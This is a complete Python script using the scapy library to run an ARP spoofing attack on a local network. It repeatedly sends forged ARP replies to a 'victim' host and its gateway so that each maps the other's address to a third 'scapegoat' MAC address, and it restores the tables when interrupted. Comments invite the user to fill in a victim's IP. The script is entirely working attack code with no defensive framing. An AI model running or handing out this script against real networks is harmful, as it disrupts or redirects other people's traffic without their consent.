from scapy.all import ARP, send
import time

victim_ip = "192.168.61.239"   # Change to your victim's IP
gateway_ip = "192.168.61.197"  # Change to your gateway's IP
victim_mac = '0c:7a:15:51:7a:89'
gateway_mac = '9e:56:cc:5d:38:ba'
scapegoat = 'cc:f9:e4:f9:6b:db'

def restore_network():
    print("[*] Restoring network ARP tables...")
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
    print("[*] Network restored.")

try:
    print("[*] Starting ARP Spoofing. Press CTRL+C to stop.")
    while True:
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=scapegoat))
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=scapegoat))
        time.sleep(2)  # Send packets every 2 seconds

except KeyboardInterrupt:
    print("\n[*] Stopping attack...")
    restore_network()
    print("[*] Exiting.")